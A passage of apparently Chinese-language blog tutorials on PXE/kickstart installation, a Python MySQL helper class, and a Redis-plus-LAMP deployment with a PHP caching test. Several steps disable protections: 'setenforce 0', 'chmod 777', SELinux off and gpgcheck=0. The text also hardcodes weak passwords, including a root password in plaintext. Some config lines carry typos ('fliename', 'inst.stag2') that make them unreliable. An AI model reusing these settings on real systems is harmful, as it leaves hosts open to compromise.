host-only</span><br><span class="line"># vim &#x2F;etc&#x2F;dhcp&#x2F;dhcpd.conf </span><br><span class="line">subnet 10.18.10.0 netmask 255.255.255.0 &#123;</span><br><span class="line">  range 10.18.10.10  10.18.10.220;</span><br><span class="line">  next-server 10.18.10.104;</span><br><span class="line">  fliename &quot;pxelinux.0&quot;;</span><br><span class="line">  default-lease-time 600;</span><br><span class="line">  max-lease-time 7200;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TFTP</span><br><span class="line">    协议：ftp</span><br><span class="line"></span><br><span class="line">安装软件</span><br><span class="line">    客户端：tftp</span><br><span class="line">    服务器：tftp-server</span><br><span class="line"></span><br><span class="line">配置</span><br><span class="line">    # vim &#x2F;etc&#x2F;xinetd.d&#x2F;tftp</span><br><span class="line">    </span><br><span class="line">        disable                 &#x3D; no</span><br><span class="line">        server_args          &#x3D; -s &#x2F;var&#x2F;lib&#x2F;tftpboot  -c</span><br><span class="line"></span><br><span class="line">        -c  上传</span><br><span class="line">重启服务</span><br><span class="line">    #&#x2F;etc&#x2F;init.d&#x2F;xinetd  restart</span><br><span class="line"></span><br><span class="line">xinetd 超级守护进程</span><br><span class="line"></span><br><span class="line">另外开启服务的方法:</span><br><span class="line">    #chkconfig      tftp    on</span><br><span class="line"></span><br><span class="line">不支持目录的上传和下载</span><br><span class="line"></span><br><span class="line">#touch &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;&#123;a.txt,b.txt&#125;</span><br><span class="line"></span><br><span class="line">为了保证tftp好用：</span><br><span class="line">    1.#&#x2F;etc&#x2F;init.d&#x2F;iptables</span><br><span class="line">    2.#setenforce 0</span><br><span class="line">    3.#chmod 777  &#x2F;var&#x2F;lib&#x2F;tftpboot  -R</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">    #tftp 172.16.70.251</span><br><span class="line">    tftp &gt; get  a.txt      &#x2F;&#x2F;下载</span><br><span class="line">    tftp &gt; put  b.txt      &#x2F;&#x2F;上传</span><br><span class="line">    tftp &gt; quit</span><br></pre></td></tr></table></figure><h5 id="引导文件-pxelinux-0"><a href="#引导文件-pxelinux-0" class="headerlink" title="引导文件-pxelinux.0"></a>引导文件-pxelinux.0</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pxelinux.0</span><br><span class="line"></span><br><span class="line">拷贝引导文件：</span><br><span class="line"># yum provides *&#x2F;pxelinux.0</span><br><span class="line">syslinux-4.05-13.el7.x86_64</span><br><span class="line"></span><br><span class="line">#yum install syslinux -y</span><br><span class="line"></span><br><span class="line"># find &#x2F; -name &#39;pxelinux.0&#39;</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;syslinux&#x2F;pxelinux.0</span><br><span class="line"></span><br><span class="line"># cp &#x2F;usr&#x2F;share&#x2F;syslinux&#x2F;pxelinux.0 &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;</span><br></pre></td></tr></table></figure><h5 id="default文件"><a href="#default文件" class="headerlink" title="default文件"></a>default文件</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">准备default文件：</span><br><span class="line"># mkdir  &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;pxelinux.cfg</span><br><span class="line"></span><br><span class="line"># mount  &#x2F;dev&#x2F;cdrom  &#x2F;mnt</span><br><span class="line"># cp &#x2F;mnt&#x2F;isolinux&#x2F;*  &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;</span><br><span class="line"># cp &#x2F;mnt&#x2F;isolinux&#x2F;isolinux.cfg  &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;pxelinux.cfg&#x2F;default</span><br><span class="line"></span><br><span class="line">修改default配置文件：</span><br><span class="line"># vim  &#x2F;var&#x2F;lib&#x2F;tftpboot&#x2F;pxelinux.cfg&#x2F;default </span><br><span class="line">label linux</span><br><span class="line">  menu label ^Install CentOS Linux 7</span><br><span class="line">  kernel   vmlinuz</span><br><span class="line">  append initrd&#x3D;initrd.img inst.stage2&#x3D;ftp:&#x2F;&#x2F;192.168.10.2&#x2F;centos7u3 inst.repo&#x3D;ftp:&#x2F;&#x2F;192.168.10.2&#x2F;centos7u3 ks&#x3D;ftp:&#x2F;&#x2F;192.168.10.2&#x2F;ks.cfg</span><br><span class="line">  </span><br><span class="line">  label linux</span><br><span class="line">  menu label ^Install CentOS Linux 7</span><br><span class="line">  kernel vmlinuz</span><br><span class="line">  append initrd&#x3D;initrd.img inst.stag2&#x3D;ftp:&#x2F;&#x2F;10.18.10.104&#x2F;centos7u3 inst.repo&#x3D;ftp:&#x2F;&#x2F;10.18.10.104&#x2F;centos7u3 ks&#x3D;ftp:&#x2F;&#x2F;10.18.10.104&#x2F;ks.cfg</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ks-cfg文件"><a href="#ks-cfg文件" class="headerlink" title="ks.cfg文件"></a>ks.cfg文件</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在一台有图形的机器上做  there</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># yum install system-config-kickstart -y</span><br><span class="line"># system-config-kickstart            弹出图形界面，然后点点点，模拟安转过程，之后生成ks.cfg文件</span><br><span class="line">把做好的ks.cfg文件拷贝到pxe服务器的&#x2F;var&#x2F;ftp&#x2F;里面去</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">做ks.cfg的机器修改：</span><br><span class="line">yum源配置：</span><br><span class="line">[development]       &#x2F;&#x2F;名字必须是这个</span><br><span class="line">name&#x3D;centos7u3</span><br><span class="line">baseurl&#x3D;file:&#x2F;&#x2F;&#x2F;mnt&#x2F;centos7u3</span><br><span class="line">enabled&#x3D;1</span><br><span class="line">gpgcheck&#x3D;0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="vsftpd"><a href="#vsftpd" class="headerlink" title="vsftpd"></a>vsftpd</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#cd  &#x2F;var&#x2F;ftp&#x2F;</span><br><span class="line">#mkdir centos7u3</span><br><span class="line">#chmod 777 -R  centos7u3</span><br><span class="line"># mount  &#x2F;dev&#x2F;cdrom  centos7u3&#x2F;</span><br><span class="line">mount: &#x2F;dev&#x2F;sr0 写保护，将以只读方式挂载</span><br><span class="line"></span><br><span class="line">启动服务</span><br></pre></td></tr></table></figure><h5 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">append initrd&#x3D;initrd.img inst.stage2&#x3D;ftp:&#x2F;&#x2F;192.168.87.101&#x2F;centos7u2 inst.repo&#x3D;ftp:&#x2F;&#x2F;192.168.87.101&#x2F;centos7u2 ks&#x3D;ftp:&#x2F;&#x2F;192.168.87.101&#x2F;centos7.cfg</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">如果使用kvm虚拟机作为客户端的话，注意要先将显示中的类型改成VNC服务器，键盘模式改成en-us，否则在虚拟机里面键盘不能使用。</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">生成root密码：IPPBXADMINROOT为密码</span><br><span class="line"># perl -e &#39;print crypt(&quot;IPPBXADMINROOT&quot;,q($1$IPPBXADM)),&quot;\n&quot;&#39;linux kickstart之中rootpw密码可以使用明文，也可以使用加密过的值（密码为：IPPBXADMINROOT）</span><br><span class="line">注意：在这里要使用加密过的值，否则安全性就太低了</span><br><span class="line"></span><br><span class="line">rootpw --iscrypted $1$IPPBXADM$qlbCgDSCK&#x2F;a.1ZzfEk&#x2F;mT.</span><br><span class="line">就是读取加密后的值，但是这个值是怎么生成的呢？</span><br><span class="line">这与linux系统的密码shadow一样，生成方法如下：</span><br><span class="line">perl -e &#39;print crypt(&quot;IPPBXADMINROOT&quot;,q($1$IPPBXADM)),&quot;\n&quot;&#39;</span><br><span class="line"></span><br><span class="line">当使用特殊字符时，例如@$符时需要在前面加上\，例：\@\$，否则加密字符串会错误；</span><br><span class="line"></span><br><span class="line">## 其中IPPBXADMINROOT为要给用户设置的密码，$1$IPPBXADM字符串是自定义字符串，shadow里一般用$1$后面跟8个字符这种格式。</span><br><span class="line">生成的密码串样式如下：</span><br><span class="line">$1$IPPBXADM$qlbCgDSCK&#x2F;a.1ZzfEk&#x2F;mT.</span><br><span class="line">中间有个$,前面算salt,后面的加密值,合在一起叫hash</span><br><span class="line">crypt 本身默认用des算法</span><br><span class="line">如果salt以$1$开头就使用md5算法</span><br><span class="line">des算法命令如下：</span><br><span class="line">perl -e &#39;print crypt(&quot;IPPBXADMINROOT&quot;,&quot;&#x2F;g&quot;),&quot;\n&quot;&#39;</span><br><span class="line"></span><br><span class="line">生成的密码串样式如下：</span><br><span class="line">&#x2F;g5fpEc81O2B2</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">生成grub2口令：</span><br><span class="line">[root@pxe-server ~]# grub2-mkpasswd-pbkdf2 </span><br><span class="line">Enter password: </span><br><span class="line">Reenter password: </span><br><span class="line">PBKDF2 hash of your password is grub.pbkdf2.sha512.10000.78528FD2B93338A97E07220BB8002B9BBC0888E37AFB241FC6B67C4DB30F4C</span><br><span class="line">83A6AFB775F1BC8476E2B9F27A506274206CF4EF0724B2B5991B1CE7AF50647E10.05D32768748A8C0CE8BF01C041177BAE0CBAA9348BBB</span><br><span class="line">47C9B0CDC765396C81D10EBD02D4FF0F2630C17CBEED921FF5192C7CF9C88D700AAC5F73DACD845A69E1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="ks-cfg示例文件"><a href="#ks-cfg示例文件" class="headerlink" title="ks.cfg示例文件"></a>ks.cfg示例文件</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CentOS 7 ks文件示例：</span><br><span class="line">#platform&#x3D;x86, AMD64, 或 Intel EM64T</span><br><span class="line">#version&#x3D;DEVEL</span><br><span class="line"># Install OS instead of upgrade</span><br><span class="line">install</span><br><span class="line"># Keyboard layouts</span><br><span class="line">keyboard &#39;us&#39;</span><br><span class="line"># Root password</span><br><span class="line">rootpw --iscrypted $1$mxXMfdmL$Sqdg6BBzPf76kWD4WpaU.1</span><br><span class="line">user --name&#x3D;martin --password&#x3D;$6$qxZqHFOqqG.q3S1E$BDsWv00mnyllWVsDvfscFDDVLOXdoR&#x2F;qplm5MISsUczVFZTc.HVGCEdKPmWJox5ZYfzIFafuSDq51nE8URJAA1 --iscrypted --gecos&#x3D;&quot;martin&quot;</span><br><span class="line"># System timezone</span><br><span class="line">timezone Asia&#x2F;Shanghai --isUtc</span><br><span class="line"># Use network installation</span><br><span class="line">url --url&#x3D;&quot;ftp:&#x2F;&#x2F;192.168.87.101&#x2F;centos7&quot;</span><br><span class="line"># System language</span><br><span class="line">lang en_US</span><br><span class="line"># Firewall configuration</span><br><span class="line">firewall --enabled</span><br><span class="line"># System authorization information</span><br><span class="line">auth  --useshadow  --passalgo&#x3D;sha512</span><br><span class="line"># Use graphical install</span><br><span class="line">graphical</span><br><span class="line">firstboot --disable</span><br><span class="line"># SELinux configuration</span><br><span class="line">selinux --disabled</span><br><span class="line"></span><br><span class="line"># Network information</span><br><span class="line">network  --bootproto&#x3D;dhcp --device&#x3D;eth0</span><br><span class="line"># Reboot after installation</span><br><span class="line">reboot</span><br><span class="line"># System bootloader configuration</span><br><span class="line">bootloader --location&#x3D;mbr</span><br><span class="line"># Clear the Master Boot Record</span><br><span class="line">zerombr</span><br><span class="line"># Partition clearing information</span><br><span class="line">clearpart --all --initlabel</span><br><span class="line"># Disk partitioning information</span><br><span class="line">part &#x2F;boot --fstype&#x3D;&quot;xfs&quot; --size&#x3D;200</span><br><span class="line">part swap --fstype&#x3D;&quot;swap&quot; --size&#x3D;2048</span><br><span class="line">part &#x2F; --fstype&#x3D;&quot;xfs&quot; --grow --size&#x3D;1</span><br><span class="line"></span><br><span class="line">%packages</span><br><span class="line">@core</span><br><span class="line">@base</span><br><span class="line">bash-completion</span><br><span class="line">vim-enhanced</span><br><span class="line">%end</span><br><span class="line"></span><br><span class="line">%post</span><br><span class="line">mkdir &#x2F;etc&#x2F;yum.repos.d&#x2F;default</span><br><span class="line">mv &#x2F;etc&#x2F;yum.repos.d&#x2F;C* &#x2F;etc&#x2F;yum.repos.d&#x2F;default</span><br><span class="line">cat &lt;&lt; eof &gt; &#x2F;etc&#x2F;yum.repos.d&#x2F;centos.repo</span><br><span class="line">[centos]</span><br><span class="line">name&#x3D;centos</span><br><span class="line">baseurl&#x3D;ftp:&#x2F;&#x2F;172.16.8.100</span><br><span class="line">enabled&#x3D;1</span><br><span class="line">gpgcheck&#x3D;0</span><br><span class="line">eof</span><br><span class="line">%end</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3连接mysql服务</title>
      <link href="2020/12/04/Python3%E8%BF%9E%E6%8E%A5mysql%E6%9C%8D%E5%8A%A1/"/>
      <url>2020/12/04/Python3%E8%BF%9E%E6%8E%A5mysql%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mysql 操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Usage mysql module</span></span><br><span class="line"><span class="string">MySQLDB:</span></span><br><span class="line"><span class="string">     host=ip or url</span></span><br><span class="line"><span class="string">     user=db user</span></span><br><span class="line"><span class="string">     password=db password</span></span><br><span class="line"><span class="string">     db=database name</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">     MySQLDB.DDL (execute mysql DDL [insert|update|delete])</span></span><br><span class="line"><span class="string">        args  sql=&#x27;update t1 set id=%s where name=%s&#x27; condition=&#x27;(1,&quot;xiaoming&quot;)&#x27; mode=&quot;[update|delete|insert]&quot;</span></span><br><span class="line"><span class="string">     MySQLDB.DQL (execute mysql DQL [select])</span></span><br><span class="line"><span class="string">        args  sql=&#x27;select id,name from t1 where id=%s&#x27; condition=&#x27;(1,)&#x27; size=data row number</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySQLDB</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,config</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param args: 用于接收未知参数</span></span><br><span class="line"><span class="string">        :param host: 用于接收数据库ip</span></span><br><span class="line"><span class="string">        :param user: 用于接收数据库用户</span></span><br><span class="line"><span class="string">        :param password:  用于接收数据库密码</span></span><br><span class="line"><span class="string">        :param port: 用于接收数据库端口</span></span><br><span class="line"><span class="string">        :param db:  用于接收数据库名称</span></span><br><span class="line"><span class="string">        :param charset: 指定字符集</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.conn = pymysql.connect(**config)</span><br><span class="line">        self.cursor = self.conn.cursor()  <span class="comment"># 生成游标对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">DDL</span>(<span class="params">self, sql, condition, mode</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:  <span class="comment"># 错误捕捉</span></span><br><span class="line">            <span class="keyword">if</span> mode == <span class="string">&#x27;insert&#x27;</span>:  <span class="comment"># 判断模式</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(condition) &gt; <span class="number">1</span>:  <span class="comment"># 如果元祖中的元素只有一个，执行cursor.execute，如果不止一个使用cursor.executemany</span></span><br><span class="line">                    result = self.cursor.executemany(sql, condition)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    result = self.cursor.execute(sql, condition)</span><br><span class="line">                print(<span class="string">f&#x27;插入完成，受影响<span class="subst">&#123;result&#125;</span>行&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> mode == <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line">                result = self.cursor.execute(sql)</span><br><span class="line">                print(<span class="string">f&#x27;更新完成，受影响<span class="subst">&#123;result&#125;</span>行&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> mode == <span class="string">&#x27;delete&#x27;</span>:</span><br><span class="line">                result = self.cursor.execute(sql)</span><br><span class="line">                print(<span class="string">f&#x27;删除完成，受影响<span class="subst">&#123;result&#125;</span>行&#x27;</span>)</span><br><span class="line">            self.conn.commit()</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:  <span class="comment"># 如果出现错误，打印错误信息并所有执行回滚</span></span><br><span class="line">            self.conn.rollback()</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">DQL</span>(<span class="params">self, sql, condition=<span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">            size=<span class="literal">None</span></span>):</span>  <span class="comment"># 查询执行条数调用self.cursor.fetchmany(size)，查询全部使用self.cursor.fetchall(size)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = self.cursor.execute(sql, condition)</span><br><span class="line">            <span class="keyword">if</span> size:</span><br><span class="line">                result2 = self.cursor.fetchmany(size)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result2 = self.cursor.fetchall()</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> result2:</span><br><span class="line">                <span class="keyword">for</span> v <span class="keyword">in</span> i.values():</span><br><span class="line">                    print(<span class="string">&#x27;%-20s&#x27;</span> % v,end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">                print()</span><br><span class="line">            print(<span class="string">f&#x27;共查找<span class="subst">&#123;result&#125;</span>条记录&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.cursor.close()</span><br><span class="line">        self.conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;详细操作手册查看 https://www.baidu.com&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  <span class="comment"># 测试语句在此行下面编写。</span></span><br><span class="line">    CONFIG = &#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;host&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db&#x27;</span>: <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;charset&#x27;</span>: <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;port&#x27;</span>: <span class="number">3306</span>,</span><br><span class="line">        <span class="string">&#x27;cursorclass&#x27;</span>: pymysql.cursors.DictCursor</span><br><span class="line">    &#125;</span><br><span class="line">    db = MySQLDB(CONFIG)</span><br><span class="line">    db.DQL(<span class="string">&#x27;select User,Host from user&#x27;</span>)</span><br><span class="line">    db.close()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 数据库 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> python </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis 部署及使用</title>
      <link href="2020/12/04/REDIS_%E5%AE%9E%E6%88%98/"/>
      <url>2020/12/04/REDIS_%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h1 id="redis-数据库基于lamp架构"><a href="#redis-数据库基于lamp架构" class="headerlink" title="redis 数据库基于lamp架构"></a>redis 数据库基于lamp架构</h1><h5 id="部署环境"><a href="#部署环境" class="headerlink" title="部署环境"></a>部署环境</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 部署redis 环境</span></span><br><span class="line">[root@redis-master ~]# mkdir -p /data/application     ---创建工作目录</span><br><span class="line">[root@redis-master ~]# wget http://download.redis.io/releases/redis-4.0.9.tar.gz   ---下载redis</span><br><span class="line">[root@redis-master ~]# tar xzf redis-4.0.9.tar.gz -C /data/application/    ---解压</span><br><span class="line">[root@redis-master ~]# cd /data/application/</span><br><span class="line">[root@redis-master application]# mv redis-4.0.9/ redis </span><br><span class="line">[root@redis-master application]# cd redis/</span><br><span class="line">[root@redis-master redis]# yum install -y gcc make  #安装编译工具</span><br><span class="line">[root@redis-master redis]# make</span><br><span class="line">注：如果报错请将刚才解压的安装包删除掉，再次重新解压并进行make安装即可。</span><br><span class="line">[root@redis-master redis]# cp redis.conf redis.conf.bak</span><br><span class="line">[root@redis-master redis]# vim redis.conf     ---修改如下</span><br><span class="line">bind 192.168.246.202　　#只监听内网IP</span><br><span class="line">daemonize yes　　　　　#开启后台模式将on改为yes</span><br><span class="line">timeout 300　　　　　　#连接超时时间</span><br><span class="line">port 6379                      #端口号</span><br><span class="line">dir /data/application/redis/data　　#本地数据库存放持久化数据的目录该目录-----需要存在</span><br><span class="line">pidfile /var/run/redis_6379.pid　　#定义pid文件</span><br><span class="line">logfile /var/log/redis.log　　#定义log文件</span><br><span class="line">创建存放数据的目录</span><br><span class="line">[root@redis-master redis]# mkdir /data/application/redis/data</span><br><span class="line">配置redis为systemctl启动</span><br><span class="line">[root@redis-master redis]# cd /lib/systemd/system</span><br><span class="line">[root@redis-master system]# vim redis.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=Redis</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/data/application/redis/src/redis-server /data/application/redis/redis.conf  --daemonize no</span><br><span class="line">ExecStop=/data/application/redis/src/redis-cli -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">参数详解:</span><br><span class="line">• [Unit] 表示这是基础信息 </span><br><span class="line">• Description 是描述</span><br><span class="line">• After 是在那个服务后面启动，一般是网络服务启动后启动</span><br><span class="line"></span><br><span class="line">• [Service] 表示这里是服务信息 </span><br><span class="line">• ExecStart 是启动服务的命令</span><br><span class="line">• ExecStop 是停止服务的指令</span><br><span class="line"></span><br><span class="line">• [Install] 表示这是是安装相关信息 </span><br><span class="line">• WantedBy 是以哪种方式启动：multi-user.target表明当系统以多用户方式（默认的运行级别）启动时，这个服务需要被自动运行。</span><br><span class="line">启动服务:</span><br><span class="line">[root@redis-master system]# systemctl daemon-reload</span><br><span class="line">[root@redis-master system]# systemctl start redis.service</span><br></pre></td></tr></table></figure><p>查看端口<br><img src="https://img-blog.csdnimg.cn/20191215220212635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 部署mariadb</span></span><br><span class="line">[root@redis-master ~]# yum install -y mariadb mariadb-server mariadb-devel</span><br><span class="line">[root@redis-master ~]# systemctl start mariadb</span><br><span class="line">[root@redis-master ~]# mysqladmin -uroot password 123456</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 配置测试数据</span></span></span><br><span class="line">https://blog.csdn.net/NewRain_wang/article/details/103541196</span><br><span class="line"><span class="meta">#</span><span class="bash"> 部署apache</span></span><br><span class="line">[root@redis-master ~]# yum install -y httpd</span><br><span class="line">[root@redis-master ~]# vim /etc/httpd/conf/httpd.conf</span><br><span class="line">DirectoryIndex index.html index.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> 部署php</span></span><br><span class="line">[root@redis-master ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/epel-release.rpm</span><br><span class="line">[root@redis-master ~]# rpm -Uvh https://mirror.webtatic.com/yum/el7/webtatic-release.rpm</span><br><span class="line">[root@redis-master ~]# yum install php70w.x86_64 php70w-cli.x86_64 php70w-common.x86_64 php70w-gd.x86_64 php70w-ldap.x86_64 php70w-mbstring.x86_64 php70w-mcrypt.x86_64 php70w-mysql.x86_64 php70w-pdo.x86_64 php70w-devel zlib-devel php70w-fpm php70w-pecl-redis  -y</span><br><span class="line">[root@redis-master ~]# vim /etc/php.ini</span><br><span class="line">878 date.timezone =Asia/Shanghai</span><br><span class="line">[root@redis-master ~]# systemctl start php-fpm</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@redis-master ~]# vim /var/www/html/index.php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">redishost = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redisport = 6379;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis = new Redis;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-&gt;connect(<span class="variable">$redishost</span>,<span class="variable">$redisport</span>) or die (<span class="string">&quot;Could not connect&quot;</span>);</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="variable">$query</span>=<span class="string">&quot;select emp_no,salary from salaries where emp_no = 10001&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">query=<span class="string">&quot;select id,name from tt1&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">key=md5(<span class="variable">$query</span>);</span></span><br><span class="line">if(!$redis-&gt;get($key))</span><br><span class="line">&#123;</span><br><span class="line">                $conn=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;t1&quot;);</span><br><span class="line">                $result=mysqli_query($conn,$query);</span><br><span class="line">                while ($row=mysqli_fetch_assoc($result))</span><br><span class="line">                &#123;</span><br><span class="line">                        $arr[]=$row;</span><br><span class="line">                &#125;</span><br><span class="line">                $f = &#x27;mysql&#x27;;</span><br><span class="line">                $redis-&gt;set($key,serialize($arr));</span><br><span class="line">                $data = $arr ;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">        $f = &#x27;redis&#x27;;</span><br><span class="line">        $data_mem=$redis-&gt;get($key);</span><br><span class="line">        $data = unserialize($data_mem);</span><br><span class="line">&#125;</span><br><span class="line">echo $f;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;$key&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"><span class="meta">//print_r($</span><span class="bash">data);</span></span><br><span class="line"><span class="meta">foreach($</span><span class="bash">data as <span class="variable">$a</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">                echo &quot;key is  &lt;b&gt;&lt;font color=#FF0000&gt;$a[id]&lt;/font&gt;&lt;/b&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">                echo &quot;value is &lt;b&gt;&lt;font color=#FF0000&gt;$a[name]&lt;/font&gt;&lt;/b&gt;&quot;;</span><br><span class="line">                echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 